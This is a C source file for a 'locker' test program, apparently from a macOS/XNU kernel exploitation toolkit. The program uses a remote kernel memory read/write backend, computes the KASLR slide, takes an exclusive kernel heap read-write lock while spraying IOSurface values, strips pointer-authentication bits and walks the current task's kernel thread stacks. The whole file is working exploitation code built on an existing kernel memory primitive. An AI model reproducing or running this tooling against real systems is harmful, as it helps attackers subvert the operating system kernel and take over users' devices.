//
//  main.c
//  locker
//
//  Created by admin on 11/25/21.
//

#include <assert.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <sys/sysctl.h>
#include <sys/errno.h>

#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOSurface/IOSurface.h>

#include <dispatch/dispatch.h>

#include "kmem.h"
#include "kmem_remote.h"
#include "slider.h"
#include "platform_params.h"
#include "allocator_msdosfs.h"

#include "xnu_proc.h"
#include "util_lck_rw.h"
#include "util_dispatch.h"
#include "util_assert.h"
#include "util_ptrauth.h"


IOSurfaceRef iosurface_create(void) {
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(CFAllocatorGetDefault(), 2, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int alloc_size_raw_value = 8;
    CFNumberRef alloc_size_cfnum = CFNumberCreate(NULL, kCFNumberSInt32Type, &alloc_size_raw_value);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), alloc_size_cfnum);
    CFDictionarySetValue(props, CFSTR("IOSurfaceIsGlobal"), kCFBooleanTrue);
    
    IOSurfaceRef surface = IOSurfaceCreate(props);
    xe_assert(surface != NULL);
    
    CFRelease(alloc_size_cfnum);
    CFRelease(props);
    return surface;
}

void iosurface_add_values(IOSurfaceRef surface, size_t idx_start, size_t count) {
    for (size_t i=0; i<count; i++) {
        char name[NAME_MAX];
        snprintf(name, sizeof(name), "xe_key_%lu", i + idx_start);
        CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault, name, kCFStringEncodingUTF8);
        CFNumberRef value = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &i);
        IOSurfaceSetValue(surface, key, value);
        CFRelease(key);
        CFRelease(value);
    }
}


int main(int argc, const char* argv[]) {
    xe_assert_cond(argc, ==, 2);
    
    struct xe_kmem_backend* client = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(client);
    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(client));
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    printf("proc: %p\n", (void*)proc);

    uintptr_t kheap_default = xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR);
    uintptr_t kh_large_map = xe_kmem_read_uint64(KMEM_OFFSET(kheap_default, TYPE_KALLOC_HEAP_MEM_KH_LARGE_MAP_OFFSET));
    uintptr_t lck_rw = KMEM_OFFSET(kh_large_map, TYPE_VM_MAP_MEM_LCK_RW_OFFSET);
    printf("[INFO] locking %p\n", (void*)lck_rw);
    
    printf("[INFO] lock start\n");
    xe_util_lck_rw_t util_lock = xe_util_lck_rw_lock_exclusive(proc, lck_rw);
    printf("[INFO] lock done\n");

    dispatch_async(xe_dispatch_queue(), ^() {
        IOSurfaceRef surface = iosurface_create();
        size_t array_len = (16384 * 3) / 8;
        printf("[INFO] begin set value\n");
        iosurface_add_values(surface, 0, array_len);
        printf("[INFO] done set value\n");
    });

    sleep(3);
    
    printf("pid: %d\n", xe_kmem_read_uint32(KMEM_OFFSET(proc, TYPE_PROC_MEM_P_PID_OFFSET)));
    
    uintptr_t task = XE_PTRAUTH_STRIP(xe_kmem_read_uint64(KMEM_OFFSET(proc, TYPE_PROC_MEM_TASK_OFFSET)));
    printf("num_threads: %d\n", xe_kmem_read_uint32(KMEM_OFFSET(task, TYPE_TASK_MEM_THREAD_COUNT_OFFSET)));
    
    uintptr_t cursor = xe_kmem_read_uint64(KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET));
    while (cursor != 0 && cursor != KMEM_OFFSET(task, TYPE_TASK_MEM_THREADS_OFFSET)) {
        uintptr_t kernel_stack = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_THREAD_MEM_KERNEL_STACK_OFFSET));
        int state = xe_kmem_read_int32(KMEM_OFFSET(cursor, TYPE_THREAD_MEM_STATE_OFFSET));

        printf("thread: %p\t kernel stack: %p\t state: %d\n", (void*)cursor, (void*)kernel_stack, state);
        cursor = xe_kmem_read_uint64(KMEM_OFFSET(cursor, TYPE_THREAD_MEM_TASK_THREADS_OFFSET));
    }

//    getpass("press enter to continue...\n");

    printf("[INFO] release start\n");
    xe_util_lck_rw_lock_done(&util_lock);
    printf("[INFO] release done\n");
//    
    getpass("press enter to continue...\n");
    
    return 0;
}
